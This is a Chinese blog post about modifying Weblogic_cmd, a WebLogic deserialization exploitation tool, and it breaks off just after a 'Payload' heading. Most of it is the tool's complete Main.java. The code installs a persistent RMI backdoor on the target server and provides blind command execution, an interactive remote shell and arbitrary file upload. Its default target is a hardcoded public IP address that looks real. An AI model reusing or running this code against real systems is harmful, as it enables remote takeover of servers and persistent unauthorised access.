<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>记一次Weblogic_cmd小改 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="记一次Weblogic_cmd小改 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/04/13/%E8%AE%B0%E4%B8%80%E6%AC%A1Weblogic_cmd%E5%B0%8F%E6%94%B9/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-04-12T16:45:02.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>April</span>
            <span>13,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">记一次Weblogic_cmd小改</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Weblogic_cmd是一款用于webloigc命令执行的工具，和ysoserial一样，当时是因为自己搭建的webloigc靶场用的是jdk8u202，版本比较高，工具默认的链子是CC1，打不通，所以自己小改了一下CC6，并且分析了一下Payload生成流程;之后用Weblogic结合RMI回显又需要改一下，踩得坑还挺多的，总结一下</p>
<h1 id="Weblogic-cmd各模块讲解"><a href="#Weblogic-cmd各模块讲解" class="headerlink" title="Weblogic_cmd各模块讲解"></a>Weblogic_cmd各模块讲解</h1><h2 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.supeream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.supeream.serial.BytesOperation;</span><br><span class="line"><span class="keyword">import</span> com.supeream.ssl.WeblogicTrustManager;</span><br><span class="line"><span class="keyword">import</span> com.supeream.weblogic.WebLogicOperation;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.cli.*;</span><br><span class="line"><span class="keyword">import</span> weblogic.cluster.singleton.ClusterMasterRemote;</span><br><span class="line"><span class="keyword">import</span> weblogic.jndi.Environment;</span><br><span class="line"><span class="keyword">import</span> weblogic.utils.encoders.BASE64Encoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JNDI_FACTORY</span> <span class="operator">=</span> <span class="string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">TYPE</span> <span class="operator">=</span> <span class="string">&quot;marshall&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; types = Arrays.asList(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;marshall&quot;</span>, <span class="string">&quot;collection&quot;</span>, <span class="string">&quot;streamMessageImpl&quot;</span>&#125;);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String version;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> CommandLine cmdLine;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Context <span class="title function_">getInitialContext</span><span class="params">(String url)</span> <span class="keyword">throws</span> NamingException, FileNotFoundException &#123;</span><br><span class="line">        <span class="type">Environment</span> <span class="variable">environment</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Environment</span>();</span><br><span class="line">        environment.setProviderUrl(url);</span><br><span class="line">        environment.setEnableServerAffinity(<span class="literal">false</span>);</span><br><span class="line">        environment.setSSLClientTrustManager(<span class="keyword">new</span> <span class="title class_">WeblogicTrustManager</span>());</span><br><span class="line">        <span class="keyword">return</span> environment.getInitialContext();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkIsAlreadyInstalled</span><span class="params">(String host, String port)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;检查是否安装rmi实例&quot;</span>);</span><br><span class="line">            <span class="type">Context</span> <span class="variable">initialContext</span> <span class="operator">=</span> getInitialContext(converUrl(host, port));</span><br><span class="line">            <span class="type">ClusterMasterRemote</span> <span class="variable">remoteCode</span> <span class="operator">=</span> (ClusterMasterRemote) initialContext.lookup(<span class="string">&quot;supeream&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;rmi已经安装&quot;</span>);</span><br><span class="line">            invokeRmi(remoteCode);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e.getMessage() !=<span class="literal">null</span> &amp;&amp; e.getMessage().contains(<span class="string">&quot;supeream&quot;</span>)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;rmi实例不存在&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line"><span class="comment">//                System.exit(0);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">executeBlind</span><span class="params">(String host, String port)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cmdLine.hasOption(<span class="string">&quot;B&quot;</span>) &amp;&amp; cmdLine.hasOption(<span class="string">&quot;C&quot;</span>)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;执行命令:&quot;</span> + cmdLine.getOptionValue(<span class="string">&quot;C&quot;</span>));</span><br><span class="line">            WebLogicOperation.blindExecute(host, port, cmdLine.getOptionValue(<span class="string">&quot;C&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;执行blind命令完成&quot;</span>);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">converUrl</span><span class="params">(String host, String port)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (cmdLine.hasOption(<span class="string">&quot;https&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;t3s://&quot;</span> + host + <span class="string">&quot;:&quot;</span> + port;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;t3://&quot;</span> + host + <span class="string">&quot;:&quot;</span> + port;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">cdConcat</span><span class="params">(List&lt;String&gt; cds)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">stringBuffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="keyword">for</span> (String cd: cds) &#123;</span><br><span class="line">            stringBuffer.append(cd);</span><br><span class="line">            stringBuffer.append(<span class="string">&quot;&amp;&amp;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stringBuffer.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">invokeRmi</span><span class="params">(ClusterMasterRemote remoteCode)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Main.cmdLine.hasOption(<span class="string">&quot;shell&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">            List&lt;String&gt; cacheCmds = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;please input cmd:&gt;&quot;</span>);</span><br><span class="line">                cmd = scanner.nextLine();</span><br><span class="line">                <span class="keyword">if</span> (cmd.equalsIgnoreCase(<span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">                    System.exit(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (cmd.startsWith(<span class="string">&quot;cd &quot;</span>)) &#123;</span><br><span class="line">                    cacheCmds.add(cmd);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (cmd.equalsIgnoreCase(<span class="string">&quot;clear&quot;</span>)) &#123;</span><br><span class="line">                    cacheCmds.clear();</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (cmd.equalsIgnoreCase(<span class="string">&quot;back&quot;</span>)) &#123;</span><br><span class="line">                    cacheCmds.remove(cacheCmds.size()-<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">newCmd</span> <span class="operator">=</span> cdConcat(cacheCmds);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!cmd.startsWith(<span class="string">&quot;cd &quot;</span>)) &#123;</span><br><span class="line">                    newCmd += cmd;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (newCmd.length()&gt;<span class="number">3</span>)&#123;</span><br><span class="line">                    newCmd = newCmd.substring(<span class="number">0</span>, newCmd.length()-<span class="number">2</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (Main.cmdLine.hasOption(<span class="string">&quot;noExecPath&quot;</span>)) &#123;</span><br><span class="line">                    result = remoteCode.getServerLocation(<span class="string">&quot;showmecode$NO$&quot;</span>+newCmd);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    result = remoteCode.getServerLocation(<span class="string">&quot;showmecode&quot;</span>+newCmd);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                System.out.println(result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;执行命令:&quot;</span> + cmd);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (Main.cmdLine.hasOption(<span class="string">&quot;noExecPath&quot;</span>)) &#123;</span><br><span class="line">                result = remoteCode.getServerLocation(<span class="string">&quot;showmecode$NO$&quot;</span>+cmd);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result = remoteCode.getServerLocation(<span class="string">&quot;showmecode&quot;</span>+cmd);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        System.setProperty(<span class="string">&quot;weblogic.security.allowCryptoJDefaultJCEVerification&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;weblogic.security.allowCryptoJDefaultPRNG&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;weblogic.security.SSL.ignoreHostnameVerification&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;weblogic.security.TrustKeyStore&quot;</span>, <span class="string">&quot;DemoTrust&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Options</span> <span class="variable">options</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Options</span>();</span><br><span class="line">        options.addOption(<span class="string">&quot;H&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;Remote Host[need set]&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;P&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;Remote Port[need set]&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;C&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;Execute Command[need set]&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;T&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;Payload Type&quot;</span> + types);</span><br><span class="line">        options.addOption(<span class="string">&quot;U&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;Uninstall rmi&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;B&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;Runtime Blind Execute Command maybe you should select os type&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;os&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;Os Type [windows,linux]&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;https&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;enable https or tls&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;shell&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;enable shell module&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;upload&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;enable upload a file&quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;src&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;path to src file &quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;dst&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;path to dst file &quot;</span>);</span><br><span class="line">        options.addOption(<span class="string">&quot;noExecPath&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;custom execute path&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> <span class="string">&quot;202.60.207.169&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">port</span> <span class="operator">=</span> <span class="string">&quot;7001&quot;</span>;</span><br><span class="line">            <span class="type">CommandLineParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultParser</span>();</span><br><span class="line">            cmdLine = parser.parse(options, args);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmdLine.hasOption(<span class="string">&quot;H&quot;</span>)) &#123;</span><br><span class="line">                host = cmdLine.getOptionValue(<span class="string">&quot;H&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">HelpFormatter</span> <span class="variable">formatter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelpFormatter</span>();</span><br><span class="line">                formatter.printHelp(<span class="string">&quot;supeream&quot;</span>, options);</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmdLine.hasOption(<span class="string">&quot;P&quot;</span>)) &#123;</span><br><span class="line">                port = cmdLine.getOptionValue(<span class="string">&quot;P&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmdLine.hasOption(<span class="string">&quot;C&quot;</span>)) &#123;</span><br><span class="line">                cmd = cmdLine.getOptionValue(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmdLine.hasOption(<span class="string">&quot;T&quot;</span>)) &#123;</span><br><span class="line">                TYPE = cmdLine.getOptionValue(<span class="string">&quot;T&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmdLine.hasOption(<span class="string">&quot;U&quot;</span>)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;开始删除rmi实例&quot;</span>);</span><br><span class="line">                WebLogicOperation.unInstallRmi(host, port);</span><br><span class="line">                System.out.println(<span class="string">&quot;后门删除实例&quot;</span>);</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            executeBlind(host, port);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (Main.cmdLine.hasOption(<span class="string">&quot;upload&quot;</span>) &amp;&amp; Main.cmdLine.hasOption(<span class="string">&quot;src&quot;</span>) &amp;&amp; Main.cmdLine.hasOption(<span class="string">&quot;dst&quot;</span>)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;开始上传文件&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> Main.cmdLine.getOptionValue(<span class="string">&quot;src&quot;</span>);</span><br><span class="line">                <span class="type">byte</span>[] fileContent = BytesOperation.GetByteByFile(path);</span><br><span class="line">                WebLogicOperation.uploadFile(host, port, Main.cmdLine.getOptionValue(<span class="string">&quot;dst&quot;</span>), fileContent);</span><br><span class="line">                System.out.println(<span class="string">&quot;file upload success&quot;</span>);</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (checkIsAlreadyInstalled(host, port)) &#123;</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;开始安装rmi实例&quot;</span>);</span><br><span class="line">            WebLogicOperation.installRmi(host, port);</span><br><span class="line">            System.out.println(<span class="string">&quot;等待rmi实例安装成功 &quot;</span>);</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Context</span> <span class="variable">initialContext</span> <span class="operator">=</span> getInitialContext(converUrl(host, port));</span><br><span class="line">            <span class="type">ClusterMasterRemote</span> <span class="variable">remoteCode</span> <span class="operator">=</span> (ClusterMasterRemote) initialContext.lookup(<span class="string">&quot;supeream&quot;</span>);</span><br><span class="line">            invokeRmi(remoteCode);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;实例安装失败&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> e.getMessage();</span><br><span class="line">            <span class="keyword">if</span> (msg != <span class="literal">null</span> &amp;&amp; msg.contains(<span class="string">&quot;Unrecognized option&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">HelpFormatter</span> <span class="variable">formatter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelpFormatter</span>();</span><br><span class="line">                formatter.printHelp(<span class="string">&quot;supeream&quot;</span>, options);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;实例rmi安装失败 请切换-OB模式&quot;</span>);</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>main方法就是程序启动类，它获取了你输入的cmdline的一系列参数，然后送往其他模块进行处理，其中的<code>invokeRmi</code>就是我说的官方自带的rmi回显策略，效果是一样，但是构造起来可能小偏差有一点，其他的就没什么好说的了，都是些通俗易懂的</p>
<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>Payload模块就是官方自带的Weblogic和RMI结合回显的策略</p>
